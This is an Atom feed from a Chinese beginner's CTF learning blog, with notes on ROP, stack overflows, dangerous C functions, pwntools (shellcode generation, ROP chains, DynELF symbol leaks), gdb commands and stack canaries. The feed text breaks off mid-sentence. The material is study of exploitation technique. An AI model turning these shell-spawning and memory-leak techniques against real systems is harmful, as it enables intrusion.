<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>汐白的学习档案</title>
  
  <subtitle>小萌新一枚QAQ</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://xibai.xyz/"/>
  <updated>2020-04-09T10:30:15.512Z</updated>
  <id>http://xibai.xyz/</id>
  
  <author>
    <name>Ximu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>汐白学Pwn-3(ROP)</title>
    <link href="http://xibai.xyz/2020/04/07/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3(ROP)/"/>
    <id>http://xibai.xyz/2020/04/07/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3(ROP)/</id>
    <published>2020-04-07T13:30:21.609Z</published>
    <updated>2020-04-09T10:30:15.512Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ROP介绍"><a href="#ROP介绍" class="headerlink" title="ROP介绍"></a>ROP介绍</h2><p>因为各种保护的出现，直接向栈或者堆上直接注入代码的方式难以发挥效果。所以需要相应的方法来绕过保护，而目前主要的是<code>ROP(Return Oriented Programming)</code>，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段<code>(gadgets)</code>来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓<code>gadgets</code>就是以<code>ret</code>结尾的指令序列，通过这些指令序列，可以修改某些地址的内容，方便控制程序的执行流程。</p><p>之所以称之为<code>ROP</code>，是因为核心在于利用了指令集中的<code>ret</code>指令，改变了指令流的执行顺序。<code>ROP</code>攻击一般得满足如下条件:</p><ul><li><p>程序存在溢出，并且可以控制返回地址。</p></li><li><p>可以找到满足条件的<code>gadgets</code>以及相应<code>gadgets</code>的地址。</p></li></ul><p>如果<code>gadgets</code>每次的地址是不固定的，就需要想办法动态获取对应的地址。</p><p>这里我是看 <strong>ctf-wiki</strong> 进行入门学习的，所以写的内容大部分都是对 <strong>ctf-wiki</strong> 上面教程的记录。<br>推荐直接去：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro-zh/" target="_blank" rel="noopener">ctf-wiki</a></p><h2 id="basic-ROP"><a href="#basic-ROP" class="headerlink" title="basic ROP"></a>basic ROP</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>汐白学Pwn-2(SomeBasic)</title>
    <link href="http://xibai.xyz/2020/03/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-2(SomeBasic)/"/>
    <id>http://xibai.xyz/2020/03/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-2(SomeBasic)/</id>
    <published>2020-03-24T14:04:21.527Z</published>
    <updated>2020-04-05T14:50:17.815Z</updated>
    
    <content type="html"><![CDATA[<h2 id="部分理论基础-Linux"><a href="#部分理论基础-Linux" class="headerlink" title="部分理论基础(Linux)"></a>部分理论基础(Linux)</h2><h3 id="栈的机制"><a href="#栈的机制" class="headerlink" title="栈的机制"></a>栈的机制</h3><p>栈是程序运行所使用的一种先进后出后进先出的线性表。大概是这样：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200330165641.png" alt="20200330165641"><br>可以看到，就好比向一个单开口的箱子中压书一样（注意：就只是平着压入！！！<del>别在那想为啥不竖着放，这样就可以想拿那个出去就拿那个出去</del>）最先压入的A如果想要拿出来必须从最上面一个个拿出来，最后才能拿出来A，即：先进后出，后进先出。<br>栈通常用来为程序运行时所调用的各种函数存放其所使用的<code>参数/变量</code>。使用时一般是这样的（每使用一个函数，在调用这个函数时就会用这个模板为函数开辟一块栈帧）：</p><table><thead><tr><th align="center"></th><th align="left"></th></tr></thead><tbody><tr><td align="center">···</td><td align="left">···</td></tr><tr><td align="center">ESP</td><td align="left">栈顶</td></tr><tr><td align="center">Local variable</td><td align="left">局部变量</td></tr><tr><td align="center">EBP</td><td align="left">栈底</td></tr><tr><td align="center">retaddr</td><td align="left">返回地址</td></tr><tr><td align="center">Incoming parameters</td><td align="left">传入参数</td></tr><tr><td align="center"><strong>···</strong></td><td align="left">···</td></tr></tbody></table><p>当一个程序运行时需要获取输入时，这个存放输入的变量对于程序而言一般都放在局部变量中（一般是局部变量，不排除别的情况）。这时候看上面的栈帧模板就会发现，如果没有严格控制输入，那么就有可能会产生因为输入过长而导致输入的数据覆盖栈底、返回地址、传入参数······这是输入数据直接存放在栈内局部变量的情况；同理，即使输入数据没有存放在栈帧中，同样也会出现其它的数据覆盖现象，无论是什么数据被覆盖，都有可能会影响到程序的正常执行，从而导致各种可能产生的后果，也正是这样才导致了pwn的出现。<br>如最简单的栈溢出就是通过覆盖函数返回地址来达成目的。</p><p>详细的栈的介绍可以参考<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro-zh/" target="_blank" rel="noopener">ctf-wiki中的栈介绍</a></p><p>这里记录一些常见的可导致溢出的危险函数：</p><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p>还未学习，暂空</p><h2 id="工具的一些使用记录"><a href="#工具的一些使用记录" class="headerlink" title="工具的一些使用记录"></a>工具的一些使用记录</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><h4 id="模块列表"><a href="#模块列表" class="headerlink" title="模块列表"></a>模块列表</h4><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">adb：安卓调试桥</span><br><span class="line">args：命令行魔法参数</span><br><span class="line">asm：汇编和反汇编，支持 i386/i686/amd64/thumb 等</span><br><span class="line">constants：对不同架构和操作系统的常量的快速访问</span><br><span class="line">config：配置文件</span><br><span class="line">context：设置运行时变量</span><br><span class="line">dynelf：用于远程函数泄露</span><br><span class="line">encoders：对 shellcode 进行编码</span><br><span class="line">elf：用于操作 ELF 可执行文件和库</span><br><span class="line">flag：提交 flag 到服务器</span><br><span class="line">fmtstr：格式化字符串利用工具</span><br><span class="line">gdb：与 gdb 配合使用</span><br><span class="line">libcdb：libc 数据库</span><br><span class="line">log：日志记录</span><br><span class="line">memleak：用于内存泄露</span><br><span class="line">rop：ROP 利用模块，包括 rop 和 srop</span><br><span class="line">runner：运行 shellcode</span><br><span class="line">shellcraft：shellcode 生成器</span><br><span class="line">term：终端处理</span><br><span class="line">timeout：超时处理</span><br><span class="line">tubes：能与 sockets, processes, ssh 等进行连接</span><br><span class="line">useragents：useragent 字符串数据库</span><br><span class="line">util：一些实用小工具</span><br><span class="line">pwnlib.atexception — Callbacks on unhandled exception</span><br><span class="line">pwnlib.atexit — Replacement <span class="keyword">for</span> atexit</span><br><span class="line">pwnlib.exception — Pwnlib exceptions</span><br><span class="line">pwnlib.replacements — Replacements <span class="keyword">for</span> various functions</span><br><span class="line">pwnlib.util.crc — Calculating CRC-sums</span><br><span class="line">pwnlib.util.cyclic — Generation of unique sequences</span><br><span class="line">pwnlib.util.fiddling — Utilities bit fiddling</span><br><span class="line">pwnlib.util.hashes — Hashing functions</span><br><span class="line">pwnlib.util.iters — Extension of standard module itertools</span><br><span class="line">pwnlib.util.lists — Operations on lists</span><br><span class="line">pwnlib.util.misc — We could not fit it any other place</span><br><span class="line">pwnlib.util.net — Networking interfaces</span><br><span class="line">pwnlib.util.packing — Packing and unpacking of strings</span><br><span class="line">pwnlib.util.proc — Working with /proc/</span><br><span class="line">pwnlib.util.safeeval — Safe evaluation of python code</span><br><span class="line">pwnlib.util.web — Utilities <span class="keyword">for</span> working with the WWW</span><br></pre></td></tr></table></figure><h4 id="常用模块和功能"><a href="#常用模块和功能" class="headerlink" title="常用模块和功能"></a>常用模块和功能</h4><h5 id="context"><a href="#context" class="headerlink" title="context"></a>context</h5><p>设置程序运行时的参数，如程序运行在什么系统什么处理器下。一般只设置三个参数：</p><blockquote><p>context(os = ‘linux’ , arch = ‘i386’ , log_level = ‘debug’)<br>或<br>context(os = ‘linux’ , arch = ‘amd64’ , log_level = ‘debug’)</p></blockquote><h5 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h5><p>用于生成汇编指令对应的机器码</p><blockquote><p>asm(‘mov eax,0’)<br>‘\xb8\x00\x00\x00\x00’</p></blockquote><p>也可以查看机器码对应的汇编指令</p><blockquote><p>disasm(“\xb8\x00\x00\x00\x00”)<br>‘mov eax,0’</p></blockquote><p>不过之前好像看到有人说这东东有缺陷，推荐最好还是用<code>keystone-engine</code></p><h5 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h5><p>一般就用个附加调试</p><blockquote><p>s = process(‘./pwnme’)<br>context.terminal = [‘gnome-terminal’, ‘-x’, ‘sh’, ‘-c’]<br>gdb.attach( proc.pidof(s) [0])</p></blockquote><p>可以在attch的时候指定要gdb运行的指令：</p><blockquote><p>gdb.attach(proc.pidof(s) [0], gdbscript=’b *0x400620\nc\n’)</p></blockquote><p>个人喜欢直接终端：gdb -P pid（process之后返回的pid）</p><h5 id="shellcraft"><a href="#shellcraft" class="headerlink" title="shellcraft"></a>shellcraft</h5><p>生成一些简单的shellcode，推荐先设置好context再用，一般直接输出shellcode内容</p><blockquote><p>print(shellcraft.sh())<br>不过这里是直接提供的汇编指令，需要将其转为机器码<br>print(asm(shellcraft.sh()))</p></blockquote><h5 id="packing"><a href="#packing" class="headerlink" title="packing"></a>packing</h5><p>用来打包数据或者解包数据</p><ul><li>打包——p32/p64(打包为32位或64位的数据)</li></ul><blockquote><p>p32(0x400010,endian = ‘big’) #设置数据为大端存储，默认为小端</p></blockquote><ul><li>解包——u32/u64</li></ul><h5 id="tubes"><a href="#tubes" class="headerlink" title="tubes"></a>tubes</h5><p>对于一次攻击而言前提就是与目标服务器或者程序进行交互，这里就可以使用remote(address, port)产生一个远程的socket然后就可以读写了</p><blockquote><p>sh = remote(‘ftp.debian.org’,21)<br>sh.recvline()<br>‘220 …’<br>sh.send(‘USER anonymous\r\n’)<br>sh.recvuntil(‘ ‘, drop=True)<br>‘331’<br>sh.recvline()<br>‘Please specify the password.\r\n’<br>sh.close()</p></blockquote><p>使用process可以打开一个本地程序并进行交互</p><blockquote><p>sh = process(‘/bin/sh’)<br>sh.sendline(‘sleep 3; echo hello world;’)<br>sh.recvline(timeout=1)<br>‘’<br>sh.recvline(timeout=5)<br>‘hello world\n’<br>sh.close()</p></blockquote><p>使用listen来开启一个本地的监听端口</p><blockquote><p>l = listen()<br>r = remote(‘localhost’, l.lport)<br>c = l.wait_for_connection()<br>r.send(‘hello’)<br>c.recv()<br>‘hello’</p></blockquote><p>用于交互时读写的函数</p><blockquote><p>interactive() : 直接进行交互，相当于回到shell的模式，在取得shell之后使用<br>recv(numb=4096, timeout=default) : 接收指定字节<br>recvall() : 一直接收直到EOF<br>recvline(keepends=True) : 接收一行，keepends为是否保留行尾的\n<br>recvuntil(delims, drop=False) : 一直读到delims的pattern出现为止<br>recvrepeat(timeout=default) : 持续接受直到EOF或timeout<br>send(data) : 发送数据<br>sendline(data) : 发送一行数据，相当于在数据末尾加\n</p></blockquote><h5 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h5><p>elf模块提供了一种便捷的方法能够迅速的得到文件内函数的地址，plt位置以及got表的位置。</p><blockquote><p>e = ELF(‘./libc.so’)<br>print hex(e.address)  # 文件装载的基地址<br>0x400000<br>print hex(e.symbols[‘write’]) # 函数地址<br>0x401680<br>print hex(e.got[‘write’]) # GOT表的地址<br>0x60b070<br>print hex(e.plt[‘write’]) # PLT的地址<br>0x401680<br>print hex(e.search(‘/bin/sh’).next())# 字符串/bin/sh的地址</p></blockquote><p>ELF模块下的一些功能</p><ul><li>asm(address, assembly) : 在指定地址进行汇编</li><li>bss(offset) : 返回bss段的位置，offset是偏移值</li><li>checksec() : 对elf进行一些安全保护检查，例如NX, PIE等。</li><li>disasm(address, n_bytes) : 在指定位置进行n_bytes个字节的反汇编</li><li>offset_to_vaddr(offset) : 将文件中的偏移offset转换成虚拟地址VMA</li><li>vaddr_to_offset(address) : 与上面的函数作用相反</li><li>read(address, count) : 在address(VMA)位置读取count个字节</li><li>write(address, data) : 在address(VMA)位置写入data</li><li>section(name) : dump出指定section的数据</li></ul><h5 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h5><p>pwntools中的ROP模块可以实现简单的ROP链的操作，就是自动地寻找程序里的gadget，自动在栈上部署对应的参数。</p><blockquote><p>elf = ELF(‘ropasaurusrex’)<br>rop = ROP(elf)<br>rop.read(0, elf.bss(0x80))<br>rop.dump()<br># [‘0x0000:        0x80482fc (read)’,<br>#  ‘0x0004:       0xdeadbeef’,<br>#  ‘0x0008:              0x0’,<br>#  ‘0x000c:        0x80496a8’]<br>str(rop)<br># &gt; ‘\xfc\x82\x04\x08\xef\xbe\xad\xde\x00\x00\x00\x00\xa8\x96\x04\x08’</p></blockquote><p>使用ROP(elf)来产生一个rop的对象，这时的ROP链还是空的，需要在其中添加函数。</p><p>因为ROP对象实现了<code>__getattr__</code>的功能，可以直接通过<code>func call</code>的形式来添加函数，<code>rop.read(0, elf.bss(0x80))</code>实际相当于<code>rop.call(&#39;read&#39;, (0, elf.bss(0x80)))</code>。 通过多次添加函数调用，最后使用<code>str</code>将整个<code>rop chain dump</code>出来就可以了。</p><ul><li>call(resolvable, arguments=()) : 添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号)</li><li>chain() : 返回当前的字节序列，即payload</li><li>dump() : 直观地展示出当前的rop chain</li><li>raw() : 在rop chain中加上一个整数或字符串</li><li>search(move=0, regs=None, order=’size’) : 按特定条件搜索gadget，没仔细研究过</li><li>unresolve(value) : 给出一个地址，反解析出符号</li></ul><p>ROP的工作还是推荐通过<code>ROPgadget</code>来进行，pwntools的<code>ROP</code>功能之前貌似看到说是不完善，只能进行相对简单的<code>ROP</code>构造</p><h5 id="DynELF-符号泄露"><a href="#DynELF-符号泄露" class="headerlink" title="DynELF 符号泄露"></a>DynELF 符号泄露</h5><p>给出一个函数句柄，可以解析任意符号的位置。这个函数的功能是：输入任意一个address，输出这个address中的data(至少1byte)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./pwnme'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">"%#x =&gt;  %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, main)</span><br><span class="line">d.lookup(<span class="literal">None</span>, <span class="string">'libc'</span>)      <span class="comment"># libc基址</span></span><br><span class="line">d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定一份elf的副本可以加速查找过程</span></span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">'./pwnme'</span>))</span><br><span class="line">d.lookup(<span class="literal">None</span>, <span class="string">'libc'</span>)</span><br><span class="line">d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br></pre></td></tr></table></figure><p>在应用中我们可以在<code>leak</code>函数中布置<code>rop</code>链，使用<code>write</code>函数<code>leak</code>出一个<code>address</code>的地址，然后返回。接着就可以使用<code>d.lookup</code>函数查找符号了，通常我们都是需要找<code>system</code>的符号。</p><h3 id="gdb-some"><a href="#gdb-some" class="headerlink" title="gdb(some)"></a>gdb(some)</h3><h4 id="list-l-命令"><a href="#list-l-命令" class="headerlink" title="list/l 命令"></a>list/l 命令</h4><p>可以使用list/l命令查看程序，方便我们添加断点时查看信息。</p><blockquote><p>list+lineNumber(中间有空格)<br>list 打印函数名称为Function的函数上下文的源程序<br>list 输出当前行后面的代码<br>list -显示当前行前面的代码</p></blockquote><h4 id="run-r命令"><a href="#run-r命令" class="headerlink" title="run/r命令"></a>run/r命令</h4><p>  在gdb中运行程序使用run命令.也可以设置程序运行参数。pwd命令用于显示当前所在目录。</p><h4 id="break-b命令"><a href="#break-b命令" class="headerlink" title="break/b命令"></a>break/b命令</h4><blockquote><p>break &lt; function &gt;           在进入指定的函数function时既停止运行，C++中可以使用class::function或function(type, type)格式来指定函数名称<br>break &lt; lineNumber&gt;          在指定的代码行打断点<br>break +offset/break -offset   在当前行的前面或后面的offset行打断点，offset为自然数<br>break filename:lineNumber     在名称为filename的文件中的第lineNumber行打断点<br>break filename:function       在名称为filename的文件中的function函数入口处打断点<br>break *address                在程序运行的内存地址处打断点<br>break                         在下一条命令处停止运行<br>break … if &lt; condition&gt;        在处理某些循环体中可使用此方法进行调试，其中…可以是上述的break lineNumber、break +offset/break -offset中的参数，其中condition表示条件，在条件成立时程序即停止运行，如设置break if i=100表示当i为100时程序停止运行。查看断点时，也可以使用info命令如info breakpoints [n]、info break [n]其中n 表示断点号来查看断点信息。</p></blockquote><h4 id="逐步调试命令"><a href="#逐步调试命令" class="headerlink" title="逐步调试命令"></a>逐步调试命令</h4><blockquote><p>next &lt; count&gt;。单步跟踪，如果有函数调用不会进入函数，如果后面不加count表示一条一条的执行，加count表示执行后面的count条指令，<br>s/step &lt; count&gt;。单步跟踪，如果有函数调用则进入该函数（进入该函数前提是此函数编译有Debug信息）,与next类似，其不加count表示一条一条执行，加上count表示自当前行开始执行count条代码指令<br>set step-mode.set step-mode on用于打开step-mode模式，这样在进行单步跟踪时，程序不会因为没有debug信息而不停止运行，这很有利于查看机器码，可以通过set step-mode off关闭step-mode模式<br>finish。运行程序直到当前函数完成并打印函数返回时的堆栈地址和返回值及参数值等信息。<br>until。运行程序直到退出循环体<br>stepi(缩写si)和nexti(缩写ni)。stepi和nexti用于单步跟踪一条及其指令，一条程序代码有可能由数条机器指令完成，stepi和nexi可以单步执行机器指令。</p></blockquote><h4 id="continue-c命令"><a href="#continue-c命令" class="headerlink" title="continue/c命令"></a>continue/c命令</h4><p>当程序遇到断点停止运行后可以使用continue命令恢复程序的运行到下一个断点或直到程序结束。</p><h4 id="print命令"><a href="#print命令" class="headerlink" title="print命令"></a>print命令</h4><p>请查看：<a href="https://blog.csdn.net/linuxheik/article/details/17380767" target="_blank" rel="noopener">https://blog.csdn.net/linuxheik/article/details/17380767</a></p><h4 id="watch命令"><a href="#watch命令" class="headerlink" title="watch命令"></a>watch命令</h4><p>watch命令一般来观察某个表达式(变量也可视为一种表达式)的值是否发生了变化，如果由变化则程序立即停止运行，其具体用法如下：</p><blockquote><p>watch &lt; expr&gt;      为表达式(变量)expr设置一个观察点一旦其数值由变化，程序立即停止运行<br>rwatch &lt; expr&gt;      当表达式expr被读时，程序立即停止运行<br>awatch &lt; expr&gt;      当表达式expr的值被读或被写时程序立即停止运行<br>info watchpoints     列出当前所设置的所有观察点</p></blockquote><h4 id="return命令"><a href="#return命令" class="headerlink" title="return命令"></a>return命令</h4><p>如果在函数中设置了调试断点，在断点后还有语句没有执行完，这个时候我们可以使用return命令强制函数忽略还没有执行的语句并返回。可以直接使用return命令用于取消当前函数的执行并立即返回函数值，也可以指定表达式如 return &lt; expression&gt;那么该表达式的值会被作为函数的返回值。</p><h4 id="info命令"><a href="#info命令" class="headerlink" title="info命令"></a>info命令</h4><p>info命令可以用来在调试时查看寄存器、断点、观察点和信号等信息。其用法如下：</p><blockquote><p>info registers:查看除了浮点寄存器以外的寄存器<br>info all-registers: 查看所有的寄存器包括浮点寄存器<br>info registers &lt; registersName&gt;:查看指定寄存器<br>info break: 查看所有断点信息<br>info watchpoints: 查看当前设置的所有观察点<br>info signals info handle: 查看有哪些信号正在被gdb检测<br>info line: 查看源代码在内存中的地址<br>info threads: 可以查看多线程</p></blockquote><h4 id="finish命令"><a href="#finish命令" class="headerlink" title="finish命令"></a>finish命令</h4><p>执行完当前的函数。</p><p>run(缩写r)和quit(缩写q)分别可以开始运行程序和退出gdb调试</p><p>whatis或ptype显示变量的类型</p><p>bt显示函数调用路径</p><h4 id="x命令"><a href="#x命令" class="headerlink" title="x命令"></a>x命令</h4><p>x/&lt; n/f/u &gt; &lt; addr &gt;</p><p>n、f、u是可选的参数。</p><p>n是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容。<br>f 表示显示的格式。如果地址所指的是字符串，那么格式可以是s，如果 地址是指令地址，那么格式可以是i。<br>u 表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字 节，g表示八字节。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。</p><p>&lt; addr &gt; 表示一个内存地址。<br>n/f/u三个参数可以一起使用。例如：</p><blockquote><p>x/3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示三个单位，u表示按十六进制显示。</p></blockquote><p>输出格式:<br>一般来说，GDB会根据变量的类型输出变量的值。但你也可以自定义GDB的输出的格式。例如，你想输出一个整数的十六进制，或是二进制来查看这个整型变量的中的位的情况。要做到这样，你可以使用GDB的数据显示格式：</p><blockquote><p>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。</p></blockquote><h4 id="简单的汇总"><a href="#简单的汇总" class="headerlink" title="简单的汇总"></a>简单的汇总</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">start                       <span class="comment">#开始调试,停在第一行代码处,(gdb)start</span></span><br><span class="line">l                           <span class="comment">#list的缩写查看源代码,(gdb) l [number/function]</span></span><br><span class="line">b &lt;lines&gt;                   <span class="comment">#b: Breakpoint的简写，设置断点。(gdb) b 10</span></span><br><span class="line">b &lt;func&gt;                    <span class="comment">#b: Breakpoint的简写，设置断点。(gdb) b main</span></span><br><span class="line">b filename:[line/<span class="keyword">function</span>]  <span class="comment">#b:在文件filename的某行或某个函数处设置断点</span></span><br><span class="line">i breakpoints               <span class="comment">#i:info 的简写。(gdb)i breakpoints</span></span><br><span class="line">d [bpNO]                    <span class="comment">#d: Delete breakpoint的简写，删除指定编号的某个断点，或删除所有断点。断点编号从1开始递增。 (gdb)d 1</span></span><br><span class="line">s                           <span class="comment">#s: step执行一行源程序代码，如果此行代码中有函数调用，则进入该函数；(gdb) s</span></span><br><span class="line">n                           <span class="comment">#n: next执行一行源程序代码，此行代码中的函数调用也一并执行。(gdb) n</span></span><br><span class="line">r                           <span class="comment">#Run的简写，运行被调试的程序。如果此前没有下过断点，则执行完整个程序；如果有断点，则程序暂停在第一个可用断点处。(gdb) r</span></span><br><span class="line">c                           <span class="comment">#Continue的简写，继续执行被调试程序，直至下一个断点或程序结束。(gdb) c</span></span><br><span class="line">finish                      <span class="comment">#函数结束</span></span><br><span class="line">p [var]                     <span class="comment">#Print的简写，显示指定变量（临时变量或全局变量 例如 int a）的值。(gdb) p a</span></span><br><span class="line">display [var]               <span class="comment">#display，设置想要跟踪的变量(例如 int a)。(gdb) display a</span></span><br><span class="line">undisplay [varnum]          <span class="comment">#undisplay取消对变量的跟踪，被跟踪变量用整型数标识。(gdb) undisplay 1</span></span><br><span class="line"><span class="built_in">set</span> args                    <span class="comment">#可指定运行时参数。(gdb)set args 10 20  args可以是内存中某个地址</span></span><br><span class="line">show args                   <span class="comment">#查看运行时参数。</span></span><br><span class="line">x/&lt;n/f/u&gt; addr              <span class="comment">#查看内存中的值，n为数量，f为输出格式，u为值类型</span></span><br><span class="line">q                           <span class="comment">#Quit的简写，退出GDB调试环境。(gdb) q</span></span><br><span class="line"><span class="built_in">help</span> [cmd]                  <span class="comment">#GDB帮助命令，提供对GDB名种命令的解释说明。如果指定了“命令名称”参数，则显示该命令的详细说明；如果没有指定参数，则分类显示所有GDB命令，供用户进一步浏览和查询。(gdb)help</span></span><br><span class="line">回车                        <span class="comment">#重复前面的命令，(gdb)回车</span></span><br></pre></td></tr></table></figure><h2 id="程序的保护机制"><a href="#程序的保护机制" class="headerlink" title="程序的保护机制"></a>程序的保护机制</h2><h3 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>该保护开启的程序运行时会在开辟的栈帧上设置一个可当作<code>令牌</code>一样的随机值，程序在运行过程中会对该值进行校验，一旦校验时发现该值被改变则立即停止程序运行。</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>开启Canary保护的程序在开辟栈帧时的结构如下：</p><blockquote><pre><code>  High  Address |                 |          +-----------------+          | args            |          +-----------------+          | return address  |          +-----------------+  rbp =&gt;  | old ebp         |          +-----------------+rbp-8 =&gt;  | canary value    |          +-----------------+          | 局部变量        |  Low     |                 |  Address</code></pre></blockquote><p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure><p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure><p>如果 Canary 已经被非法修改，此时程序流程会走到 <strong>stack_chk_fail。</strong>stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">eglibc-2.19&#x2F;debug&#x2F;stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  &#x2F;* The loop is added only to keep gcc happy.  *&#x2F;</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味可以通过劫持 __stack_chk_fail 的 got 